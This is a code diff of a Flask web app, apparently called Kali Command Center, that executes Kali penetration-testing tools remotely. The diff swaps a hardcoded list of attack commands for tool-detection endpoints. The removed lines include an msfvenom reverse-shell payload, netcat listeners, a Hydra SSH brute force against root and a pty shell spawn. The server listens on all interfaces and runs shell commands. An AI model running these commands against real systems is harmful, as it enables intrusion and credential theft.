@@ -1,6 +1,7 @@
 #!/usr/bin/env python3
 """
 Kali Command Center - Web界面远程执行Kali工具
+集成自动工具检测和详细使用指南
 """
 import os
 import sys
@@ -12,10 +13,13 @@ from datetime import datetime
 from flask import Flask, render_template_string, request, Response, stream_with_context
 from pathlib import Path
 
+from kali_tools_detector import KaliToolDetector
+
 app = Flask(__name__)
 
 COMMANDS_HISTORY = []
 TASKS = {}
+TOOL_DETECTOR = KaliToolDetector()
 
 class CommandTask:
     def __init__(self, task_id, command, shell=True):
@@ -98,41 +102,50 @@ def execute_command():
 def get_history():
     """获取命令历史"""
     return Response(
-        json.dumps(COMMANDS_HISTORY[-50:]),  # 最近50条
+        json.dumps(COMMANDS_HISTORY[-50:]),
         mimetype='application/json'
     )
 
 @app.route('/tools', methods=['GET'])
 def get_tools():
-    """获取预置工具列表"""
-    tools = [
-        {'name': 'Nmap Scan', 'command': 'nmap -sV -sC', 'category': 'Reconnaissance'},
-        {'name': 'Net Discover', 'command': 'netdiscover -i eth0', 'category': 'Reconnaissance'},
-        {'name': 'Dirb Scan', 'command': 'dirb http://target.com', 'category': 'Web'},
-        {'name': 'Nikto Scan', 'command': 'nikto -h target.com', 'category': 'Web'},
-        {'name': 'SQLMap Basic', 'command': 'sqlmap -u "http://target.com/?id=1" --batch', 'category': 'Web'},
-        {'name': 'Hydra SSH', 'command': 'hydra -l root -P passwords.txt ssh://target', 'category': 'Password'},
-        {'name': 'John Hash', 'command': 'john --wordlist=rockyou.txt hash.txt', 'category': 'Password'},
-        {'name': 'Metasploit', 'command': 'msfconsole', 'category': 'Exploitation'},
-        {'name': 'SearchSploit', 'command': 'searchsploit keyword', 'category': 'Exploitation'},
-        {'name': 'Aircrack-ng', 'command': 'aircrack-ng -w wordlist.txt capture.cap', 'category': 'Wireless'},
-        {'name': 'Wireshark', 'command': 'wireshark &', 'category': 'Sniffing'},
-        {'name': 'Tcpdump', 'command': 'tcpdump -i eth0 -n', 'category': 'Sniffing'},
-        {'name': 'Burp Suite', 'command': 'burpsuite &', 'category': 'Web'},
-        {'name': 'Gobuster', 'command': 'gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt', 'category': 'Web'},
-        {'name': 'Nikto', 'command': 'nikto -h target.com', 'category': 'Web'},
-        {'name': 'Netcat Listen', 'command': 'nc -lvp 4444', 'category': 'Networking'},
-        {'name': 'Netcat Connect', 'command': 'nc -nv target.com 4444', 'category': 'Networking'},
-        {'name': 'Msfvenom', 'command': 'msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f elf > shell.elf', 'category': 'Payload'},
-        {'name': 'Python Shell', 'command': 'python3 -c "import pty;pty.spawn(\'/bin/bash\')"', 'category': 'Shells'},
-        {'name': 'System Info', 'command': 'uname -a && cat /etc/os-release && ifconfig', 'category': 'System'},
-        {'name': 'Services', 'command': 'systemctl list-units --type=service --state=running', 'category': 'System'},
-        {'name': 'Netstat', 'command': 'netstat -tulnp', 'category': 'Networking'},
-        {'name': 'SS', 'command': 'ss -tulnp', 'category': 'Networking'},
-        {'name': 'PS', 'command': 'ps aux', 'category': 'System'},
-        {'name': 'Top', 'command': 'top -bn1', 'category': 'System'},
-    ]
-    return Response(json.dumps(tools), mimetype='application/json')
+    """获取已安装的工具列表（按分类）"""
+    detected = TOOL_DETECTOR.detect_all_tools()
+    return Response(json.dumps(detected), mimetype='application/json')
+
+@app.route('/tools/database', methods=['GET'])
+def get_tools_database():
+    """获取完整工具数据库（所有工具，包括未安装的）"""
+    database = TOOL_DETECTOR.get_tools_database()
+    return Response(json.dumps(database), mimetype='application/json')
+
+@app.route('/tools/detect', methods=['POST'])
+def detect_tools():
+    """手动触发工具检测"""
+    detected = TOOL_DETECTOR.detect_all_tools()
+    return Response(json.dumps({
+        'status': 'success',
+        'detected': detected
+    }), mimetype='application/json')
+
+@app.route('/tools/<tool_key>', methods=['GET'])
+def get_tool_details(tool_key):
+    """获取特定工具的详细信息"""
+    all_tools = TOOL_DETECTOR.get_all_tools_flat()
+    for tool in all_tools:
+        if tool['key'] == tool_key:
+            return Response(json.dumps(tool), mimetype='application/json')
+    return Response(json.dumps({'error': 'Tool not found'}), 
+                   mimetype='application/json', status=404)
+
+@app.route('/tools/search', methods=['GET'])
+def search_tools():
+    """搜索工具"""
+    keyword = request.args.get('q', '')
+    if not keyword:
+        return Response(json.dumps([]), mimetype='application/json')
+    
+    results = TOOL_DETECTOR.search_tools(keyword)
+    return Response(json.dumps(results), mimetype='application/json')
 
 @app.route('/task/<task_id>', methods=['GET'])
 def get_task(task_id):
@@ -170,12 +183,23 @@ def stop_task(task_id):
                    mimetype='application/json', status=400)
 
 def print_banner():
-    """打印启动信息"""
+    """打印启动信息和检测到的工具"""
     print("\n" + "="*60)
     print("  🔥 Kali Command Center - Web管理界面")
     print("="*60)
     print("  ⚡ 实时命令执行 | 远程工具管理")
-    print("="*60 + "\n")
+    print("="*60)
+    
+    print("\n[🔍] 正在检测已安装的Kali工具...")
+    detected = TOOL_DETECTOR.detect_all_tools()
+    
+    total_tools = 0
+    for category, data in detected.items():
+        tool_count = len(data['tools'])
+        total_tools += tool_count
+        print(f"  {data['icon']} {category}: {tool_count} 个工具")
+    
+    print(f"\n  ✅ 共检测到 {total_tools} 个工具")
 
 if __name__ == '__main__':
     print_banner()
@@ -183,12 +207,11 @@ if __name__ == '__main__':
     host = '0.0.0.0'
     port = 5000
     
-    print(f"[📡] 服务启动中...")
+    print(f"\n[📡] 服务启动中...")
     print(f"[🌐] 访问地址: http://<kali-ip>:{port}")
     print(f"[💻] 本机访问: http://localhost:{port}")
     print(f"\n[⏹]  按 Ctrl+C 停止服务\n")
     
-    # 创建templates目录
     templates_dir = Path('/workspace/kali-command-center/templates')
     templates_dir.mkdir(exist_ok=True)
     
